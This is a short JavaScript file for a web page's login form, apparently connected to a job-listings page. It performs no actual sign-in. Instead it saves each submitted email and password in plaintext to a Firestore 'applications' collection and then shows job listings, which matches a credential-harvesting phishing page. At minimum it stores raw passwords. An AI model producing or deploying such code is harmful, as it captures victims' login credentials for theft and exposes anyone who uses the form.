import { db } from './firebase-config.js';
import { collection, addDoc } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-firestore.js";

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('loginForm');
    const errorMsg = document.getElementById('errorMsg');
    const jobList = document.getElementById('jobListings');

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!email || !password) {
            errorMsg.textContent = 'Please fill in both fields.';
            return;
        }

        try {
            await addDoc(collection(db, 'applications'), {
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            });
            console.log('Data saved successfully');
            form.style.display = 'none';
            jobList.style.display = 'block';
            errorMsg.textContent = '';
        } catch (error) {
            console.error('Error saving:', error);
            errorMsg.textContent = 'Failed to save. Check console.';
        }
    });
});
